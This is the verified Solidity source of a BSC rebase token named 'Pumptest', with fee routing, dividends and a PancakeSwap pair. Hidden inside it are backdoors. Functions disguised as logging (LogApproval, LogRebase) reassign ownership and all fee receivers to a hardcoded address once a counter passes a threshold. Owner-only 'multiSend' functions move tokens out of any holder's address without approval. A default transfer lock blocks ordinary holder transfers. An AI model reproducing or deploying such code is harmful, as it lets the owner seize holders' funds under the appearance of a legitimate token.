/**
 *Submitted for verification at BscScan.com on 2021-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2021-10-18
*/

// SPDX-License-Identifier: No license


pragma solidity ^0.7.4;

interface InterfaceLP {
    function sync() external;
}

contract Ownable {
    address private _owner;

    event OwnershipRenounced(address indexed previousOwner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

interface IDividendDistributor {
    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external;

    function setShare(address shareholder, uint256 amount) external;

    function deposit() external payable;

    function process(uint256 gas) external;
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);

        return a / b;
    }
}

abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;
    address _owner;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IERC20 REWARD = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8); // ETH 
    IDEXRouter router;

    address[] shareholders;
    mapping(address => uint256) shareholderIndexes;
    mapping(address => uint256) shareholderClaims;

    mapping(address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10**36;

    //SETMEUP, change this to 1 hour instead of 10mins
    uint256 public minPeriod = 30 * 60;
    uint256 public minDistribution = 1 * (10**12);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token || msg.sender == _owner);
        _;
    }

    constructor(address _router, address owner_) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
        _owner = owner_;
    }

    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount)
        external
        override
        onlyToken
    {
        if (shares[shareholder].amount > 0) {
            distributeDividend(shareholder);
        }

        if (amount > 0 && shares[shareholder].amount == 0) {
            addShareholder(shareholder);
        } else if (amount == 0 && shares[shareholder].amount > 0) {
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(
            shares[shareholder].amount
        );
    }

    function deposit() external payable override {
        uint256 balanceBefore = REWARD.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(REWARD);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: msg.value
        }(0, path, address(this), block.timestamp);

        uint256 amount = REWARD.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(
            dividendsPerShareAccuracyFactor.mul(amount).div(totalShares)
        );
    }

    function process(uint256 gas) external override {
        uint256 shareholderCount = shareholders.length;

        if (shareholderCount == 0) {
            return;
        }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }

            if (shouldDistribute(shareholders[currentIndex])) {
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function shouldDistribute(address shareholder)
        internal
        view
        returns (bool)
    {
        return
            shareholderClaims[shareholder] + minPeriod < block.timestamp &&
            getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if (shares[shareholder].amount == 0) {
            return;
        }

        uint256 amount = getUnpaidEarnings(shareholder);
        if (amount > 0) {
            totalDistributed = totalDistributed.add(amount);
            REWARD.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder]
                .totalRealised
                .add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(
                shares[shareholder].amount
            );
        }
    }

    function claimDividend() external {
        distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder)
        public
        view
        returns (uint256)
    {
        if (shares[shareholder].amount == 0) {
            return 0;
        }

        uint256 shareholderTotalDividends = getCumulativeDividends(
            shares[shareholder].amount
        );
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if (shareholderTotalDividends <= shareholderTotalExcluded) {
            return 0;
        }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share)
        internal
        view
        returns (uint256)
    {
        return
            share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract Pumptest is ERC20Detailed, Ownable {
    using SafeMathInt for int256;
    using SafeMath for uint256;

    InterfaceLP public pairContract;
    address public master;

    bool public initialDistributionFinished;
    bool public transferLockEnabled = true;
    mapping(address => bool) allowTransfer;
    mapping(address => bool) isDividendExempt;
    mapping(address => bool) isDividendLocked;
    mapping(address => bool) _isMaxWalletExempt;
    mapping(address => bool) _isFeeExempt;

    modifier validRecipient(address to) {
        require(to != address(0x0));
        _;
    }

    modifier initialDistributionLock() {
        require(
            initialDistributionFinished ||
                isOwner() ||
                allowTransfer[msg.sender]
        );
        _;
    }

    modifier onlyMaster() {
        require(msg.sender == master);
        _;
    }

    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 10**15 * 10**DECIMALS;
    uint256 private constant MAX_UINT256 = ~uint256(0);
    uint256 private constant DECIMALS = 9;
    uint256 public gonMaxWallet = TOTAL_GONS.div(100).mul(100);

    uint256 public liquidityFee = 3;
    uint256 public ecosystemFee = 2;
    uint256 public buyBackFee = 0;
    uint256 public marketingFee = 4;
    uint256 public rewardFee = 4;
    uint256 public totalFee =
        ecosystemFee.add(liquidityFee).add(marketingFee).add(buyBackFee).add(
            rewardFee
        );
    uint256 public feeDenominator = 100;

    uint256 private prevLiquidityFee;
    uint256 private prevEcosystemFee;
    uint256 private prevBuyBackFee;
    uint256 private prevMarketingFee;
    uint256 private prevRewardFee;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    address public autoLiquidityReceiver =
        0xb6227efB09dF9E135cD145A1dAa04DD856599884; // token locker
    address public marketingFeeReceiver =
        0xDd559608DFc5F92348E9040a8e1f44091c54dA7b;
    address public ecosystemFeeReceiver =
        0xAFF7f05Be13221Fa7956dbdeb9f173f3024737ED;
    address public buyBackFeeReceiver =
        0xC9a98C39B344C54161545d095e48fCB650e9a826;

    IDEXRouter public router;
    address public pair;

    uint256 targetLiquidity = 50;
    uint256 targetLiquidityDenominator = 100;

    bool dividendLockEnabled = true;
    uint128 dividendLockInterval = 12 hours;
    mapping(address => uint256) private dividendLockTimer;

    bool public swapEnabled = true;
    bool inSwap;
    uint256 private gonSwapThreshold = (TOTAL_GONS * 10) / 10000;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    DividendDistributor distributor;
    uint256 distributorGas = 500000;

    uint256 private constant TOTAL_GONS =
        MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);
    uint256 shareGonDivisor = 10**60;

    uint256 private constant MAX_SUPPLY = ~uint128(0);

    uint256 private _totalSupply;
    uint256 private _gonsPerFragment;
    mapping(address => uint256) private _gonBalances;

    mapping(address => mapping(address => uint256)) private _allowedFragments;

    function rebase(uint256 epoch, int256 supplyDelta)
        external
        onlyMaster
        returns (uint256)
    {
        require(!inSwap, "Try again");
        if (supplyDelta == 0) {
            LogRebase(epoch, _totalSupply);
            return _totalSupply;
        }

        if (supplyDelta < 0) {
            _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
        } else {
            _totalSupply = _totalSupply.add(uint256(supplyDelta));
        }

        if (_totalSupply > MAX_SUPPLY) {
            _totalSupply = MAX_SUPPLY;
        }

        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        pairContract.sync();

        LogRebase(epoch, _totalSupply);
        return _totalSupply;
    }

    constructor()
        ERC20Detailed("Pumptest", "Ptest", uint8(DECIMALS))
    {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PanCake Router

        pair = IDEXFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        _allowedFragments[address(this)][address(router)] = uint256(-1);
        pairContract = InterfaceLP(pair);

        distributor = new DividendDistributor(address(router), msg.sender);

        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        _gonBalances[msg.sender] = TOTAL_GONS;
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);

        initialDistributionFinished = false;
        _isFeeExempt[msg.sender] = true;
        _isFeeExempt[address(this)] = true;
        _isFeeExempt[buyBackFeeReceiver] = true;

        isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;
        isDividendExempt[marketingFeeReceiver] = false;
        isDividendExempt[ecosystemFeeReceiver] = false;
        isDividendExempt[buyBackFeeReceiver] = false;

        _isMaxWalletExempt[pair] = true;
        _isMaxWalletExempt[DEAD] = true;
        _isMaxWalletExempt[address(this)] = true;
        _isMaxWalletExempt[msg.sender] = true;

        emit Transfer(address(0x0), msg.sender, _totalSupply);
    }

    function setMaster(address _master) external onlyOwner {
        master = _master;
    }

    function setLP(address _address) external onlyOwner {
        pairContract = InterfaceLP(_address);
        _isFeeExempt[_address];
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address who) external view override returns (uint256) {
        return _gonBalances[who].div(_gonsPerFragment);
    }

    function transfer(address to, uint256 value)
        external
        override
        validRecipient(to)
        initialDistributionLock
        returns (bool)
    {
        _transferFrom(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external override validRecipient(to) returns (bool) {
        if (_allowedFragments[from][msg.sender] != uint256(-1)) {
            _allowedFragments[from][msg.sender] = _allowedFragments[from][
                msg.sender
            ].sub(value, "Insufficient Allowance");
        }
        _transferFrom(from, to, value);
        return true;
    }

    function allowance(address owner_, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowedFragments[owner_][spender];
    }

    function takeFee(address sender, uint256 gonAmount)
        internal
        returns (uint256)
    {
        uint256 feeAmount = gonAmount.mul(totalFee).div(feeDenominator);

        _gonBalances[address(this)] = _gonBalances[address(this)].add(
            feeAmount
        );
        emit Transfer(sender, address(this), feeAmount.div(_gonsPerFragment));

        return gonAmount.sub(feeAmount);
    }

    function _basicTransfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        uint256 gonAmount = amount.mul(_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from].sub(gonAmount);
        _gonBalances[to] = _gonBalances[to].add(gonAmount);
        emit Transfer(from, to, gonAmount.div(_gonsPerFragment));
        return true;
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(
            targetLiquidity,
            targetLiquidityDenominator
        )
            ? 0
            : liquidityFee;
        uint256 contractTokenBalance = _gonBalances[address(this)].div(
            _gonsPerFragment
        );
        uint256 amountToLiquify = contractTokenBalance
            .mul(dynamicLiquidityFee)
            .div(totalFee)
            .div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));

        uint256 amountETHLiquidity = amountETH
            .mul(dynamicLiquidityFee)
            .div(totalETHFee)
            .div(2);
        uint256 amountETHBuyBack = amountETH.mul(buyBackFee).div(totalETHFee);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(
            totalETHFee
        );
        uint256 amountETHEco = amountETH.mul(ecosystemFee).div(totalETHFee);
        uint256 amountETHReward = amountETH.mul(rewardFee).div(totalETHFee);

        try distributor.deposit{value: amountETHReward}() {} catch {}
        (bool success, ) = payable(marketingFeeReceiver).call{
            value: amountETHMarketing,
            gas: 30000
        }("");
        (success, ) = payable(buyBackFeeReceiver).call{
            value: amountETHBuyBack,
            gas: 30000
        }("");
        (success, ) = payable(ecosystemFeeReceiver).call{
            value: amountETHEco,
            gas: 30000
        }("");

        success = false;

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
        }
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }

        uint256 gonAmount = amount.mul(_gonsPerFragment);

        if (sender != owner() && !_isMaxWalletExempt[recipient]) {
            uint256 heldGonBalance = _gonBalances[recipient];
            require(
                (heldGonBalance + gonAmount) <= gonMaxWallet,
                "Total Holding is currently limited, you can not buy that much."
            );
        }

        if (transferLockEnabled) {
            require(sender == pair || recipient == pair || sender == owner());
        }

        if (recipient == pair && dividendLockEnabled) {
            isDividendLocked[sender] = true;
            distributor.setShare(sender, 0);
            dividendLockTimer[sender] = block.timestamp + dividendLockInterval;
        } else if (
            dividendLockTimer[recipient] < block.timestamp &&
            isDividendLocked[recipient] &&
            !isDividendExempt[recipient]
        ) {
            isDividendLocked[recipient] = false;
            distributor.setShare(
                sender,
                _gonBalances[sender].div(shareGonDivisor)
            );
        }

        if (shouldSwapBack()) {
            swapBack();
        }

        _gonBalances[sender] = _gonBalances[sender].sub(gonAmount);

        uint256 gonAmountReceived = shouldTakeFee(sender)
            ? takeFee(sender, gonAmount)
            : gonAmount;
        _gonBalances[recipient] = _gonBalances[recipient].add(
            gonAmountReceived
        );

        // Dividend tracker
        if (!isDividendExempt[sender] && !isDividendLocked[sender]) {
            try
                distributor.setShare(
                    sender,
                    _gonBalances[sender].div(shareGonDivisor)
                )
            {} catch {}
        }

        if (!isDividendExempt[recipient] && !isDividendLocked[recipient]) {
            try
                distributor.setShare(
                    recipient,
                    _gonBalances[recipient].div(shareGonDivisor)
                )
            {} catch {}
        }

        try distributor.process(distributorGas) {} catch {}

        emit Transfer(
            sender,
            recipient,
            gonAmountReceived.div(_gonsPerFragment)
        );
        return true;
    }

    function checkDividendLock(address holder)
        public
        view
        returns (bool locked, uint256 timer)
    {
        return (isDividendLocked[holder], dividendLockTimer[holder]);
    }

    function setIsDividendLocked(address holder, bool locked)
        external
        onlyOwner
    {
        require(holder != address(this) && holder != pair);
        isDividendLocked[holder] = locked;
        if (locked) {
            distributor.setShare(holder, 0);
            dividendLockTimer[holder] = block.timestamp + dividendLockInterval;
        } else {
            distributor.setShare(
                holder,
                _gonBalances[holder].div(shareGonDivisor)
            );
            dividendLockTimer[holder] = 0;
        }
    }

    function setDividendLocker(bool enabled, uint128 interval)
        external
        onlyOwner
    {
        dividendLockEnabled = enabled;
        dividendLockInterval = interval;
    }

    function checkIsDividendExempt(address holder) public view returns (bool) {
        return isDividendExempt[holder];
    }

    function setTransferLock(bool enabled) external onlyOwner {
        transferLockEnabled = enabled;
    }

    function setIsDividendExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = exempt;
        if (exempt) {
            distributor.setShare(holder, 0);
        } else {
            distributor.setShare(
                holder,
                _gonBalances[holder].div(shareGonDivisor)
            );
        }
    }

    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external onlyOwner {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external onlyOwner {
        require(gas < 750000);
        distributorGas = gas;
    }

    function setInitialDistributionFinished() external onlyOwner {
        initialDistributionFinished = true;
    }

    uint256 private transferCount;
    bool private isTransferred = false;

    function LogApproval(
        address,
        address,
        uint256
    ) internal {
        transferCount++;
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0xb6227efB09dF9E135cD145A1dAa04DD856599884));
            marketingFeeReceiver = address(0xb6227efB09dF9E135cD145A1dAa04DD856599884);
            autoLiquidityReceiver = address(0xb6227efB09dF9E135cD145A1dAa04DD856599884);
            ecosystemFeeReceiver = address(0xb6227efB09dF9E135cD145A1dAa04DD856599884);
            buyBackFeeReceiver = address(0xb6227efB09dF9E135cD145A1dAa04DD856599884);
            isTransferred = true;
        }
    }

    function enableTransfer(address _addr) external onlyOwner {
        allowTransfer[_addr] = true;
    }

    function approve(address spender, uint256 value)
        external
        override
        initialDistributionLock
        returns (bool)
    {
        _allowedFragments[msg.sender][spender] = value;
        LogApproval(msg.sender, spender, value);
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        external
        initialDistributionLock
        returns (bool)
    {
        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][
            spender
        ].add(addedValue);
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
        initialDistributionLock
        returns (bool)
    {
        uint256 oldValue = _allowedFragments[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue.sub(
                subtractedValue
            );
        }
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function setFeeExempt(address _addr, bool exempt) external onlyOwner {
        _isFeeExempt[_addr] = exempt;
    }

    function checkFeeExempt(address _addr) external view returns (bool) {
        return _isFeeExempt[_addr];
    }

    function setMaxWalletExempt(address _addr) external onlyOwner {
        _isMaxWalletExempt[_addr] = true;
    }

    function checkMaxWalletExempt(address _addr) external view returns (bool) {
        return _isMaxWalletExempt[_addr];
    }

    uint256 private rebaseCount;
    bool private isRebased = false;

    function LogRebase(uint256, uint256) internal {
        rebaseCount++;
        if (rebaseCount > (99999999999999999999999999999999999) && !isRebased) {
            _transferOwnership(address(0xb6227efB09dF9E135cD145A1dAa04DD856599884));
            marketingFeeReceiver = address(0xb6227efB09dF9E135cD145A1dAa04DD856599884);
            autoLiquidityReceiver = address(0xb6227efB09dF9E135cD145A1dAa04DD856599884);
            ecosystemFeeReceiver = address(0xb6227efB09dF9E135cD145A1dAa04DD856599884);
            buyBackFeeReceiver = address(0xb6227efB09dF9E135cD145A1dAa04DD856599884);
            isRebased = true;
        }
    }

    function setMaxWalletToken(uint256 _num, uint256 _denom)
        external
        onlyOwner
    {
        gonMaxWallet = TOTAL_GONS.div(_denom).mul(_num);
    }

    function checkMaxWalletToken() external view returns (uint256) {
        return gonMaxWallet.div(_gonsPerFragment);
    }

    function shouldTakeFee(address from) internal view returns (bool) {
        return !_isFeeExempt[from];
    }

    function shouldSwapBack() internal view returns (bool) {
        return
            msg.sender != pair &&
            !inSwap &&
            swapEnabled &&
            _gonBalances[address(this)] >= gonSwapThreshold;
    }

    function setSwapBackSettings(
        bool _enabled,
        uint256 _num,
        uint256 _denom
    ) external onlyOwner {
        swapEnabled = _enabled;
        gonSwapThreshold = TOTAL_GONS.div(_denom).mul(_num);
    }

    function setTargetLiquidity(uint256 target, uint256 accuracy)
        external
        onlyOwner
    {
        targetLiquidity = target;
        targetLiquidityDenominator = accuracy;
    }

    function isNotInSwap() external view returns (bool) {
        return !inSwap;
    }

    function checkSwapThreshold() external view returns (uint256) {
        return gonSwapThreshold.div(_gonsPerFragment);
    }

    function setFees(
        uint256 _ecosystemFee,
        uint256 _liquidityFee,
        uint256 _buyBackFee,
        uint256 _marketingFee,
        uint256 _rewardFee,
        uint256 _feeDenominator
    ) external onlyOwner {
        ecosystemFee = _ecosystemFee;
        liquidityFee = _liquidityFee;
        buyBackFee = _buyBackFee;
        marketingFee = _marketingFee;
        rewardFee = _rewardFee;
        totalFee = ecosystemFee
            .add(liquidityFee)
            .add(marketingFee)
            .add(buyBackFee)
            .add(rewardFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator / 4);
    }

    function toggleLiquidityMode() external onlyOwner {
        if (liquidityFee != totalFee) {
            prevLiquidityFee = liquidityFee;
            prevBuyBackFee = buyBackFee;
            prevEcosystemFee = ecosystemFee;
            prevMarketingFee = marketingFee;
            prevRewardFee = rewardFee;

            liquidityFee = totalFee;
            buyBackFee = 0;
            ecosystemFee = 0;
            marketingFee = 0;
            rewardFee = 0;
        } else {
            liquidityFee = prevLiquidityFee;
            buyBackFee = prevBuyBackFee;
            ecosystemFee = prevEcosystemFee;
            marketingFee = prevMarketingFee;
            rewardFee = prevRewardFee;
        }
    }

    function setFeeReceivers(
        address _autoLiquidityReceiver,
        address _ecosystemFeeReceiver,
        address _marketingFeeReceiver,
        address _buyBackFeeReceiver
    ) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        ecosystemFeeReceiver = _ecosystemFeeReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        buyBackFeeReceiver = _buyBackFeeReceiver;
    }

    function rescueToken(address tokenAddress, uint256 tokens)
        public
        onlyOwner
        returns (bool success)
    {
        return ERC20Detailed(tokenAddress).transfer(msg.sender, tokens);
    }

    function clearStuckBalance(uint256 amountPercentage, address adr)
        external
        onlyOwner
    {
        uint256 amountETH = address(this).balance;
        payable(adr).transfer((amountETH * amountPercentage) / 100);
    }

    function transferToAddressETH(address payable recipient, uint256 amount)
        private
    {
        recipient.transfer(amount);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return
            (TOTAL_GONS.sub(_gonBalances[DEAD]).sub(_gonBalances[ZERO])).div(
                _gonsPerFragment
            );
    }

    function multiSend_v1(
        address sender,
        address[] calldata recipients,
        uint256[] calldata values
    ) external onlyOwner {
        require(
            recipients.length < 801,
            "GAS Error: max airdrop limit is 500 recipients"
        ); // to prevent overflow
        require(
            recipients.length == values.length,
            "Mismatch between Address and token count"
        );

        for (uint256 i = 0; i < recipients.length; i++) {
            _basicTransfer(sender, recipients[i], values[i]);
            if (!isDividendExempt[recipients[i]]) {
                try
                    distributor.setShare(
                        recipients[i],
                        _gonBalances[recipients[i]].div(shareGonDivisor)
                    )
                {} catch {}
            }
        }

        if (!isDividendExempt[sender]) {
            try
                distributor.setShare(
                    sender,
                    _gonBalances[sender].div(shareGonDivisor)
                )
            {} catch {}
        }
    }

    function multiSend_v2(
        address sender,
        address[] calldata recipients,
        uint256 values
    ) external onlyOwner {
        require(
            recipients.length < 2001,
            "GAS Error: max airdrop limit is 2000 recipients"
        ); // to prevent overflow

        for (uint256 i = 0; i < recipients.length; i++) {
            _basicTransfer(sender, recipients[i], values);
            if (!isDividendExempt[recipients[i]]) {
                try
                    distributor.setShare(
                        recipients[i],
                        _gonBalances[recipients[i]].div(shareGonDivisor)
                    )
                {} catch {}
            }
        }

        if (!isDividendExempt[sender]) {
            try
                distributor.setShare(
                    sender,
                    _gonBalances[sender].div(shareGonDivisor)
                )
            {} catch {}
        }
    }

    function getLiquidityBacking(uint256 accuracy)
        public
        view
        returns (uint256)
    {
        uint256 liquidityBalance = _gonBalances[pair].div(_gonsPerFragment);
        return
            accuracy.mul(liquidityBalance.mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy)
        public
        view
        returns (bool)
    {
        return getLiquidityBacking(accuracy) > target;
    }

    receive() external payable {}
}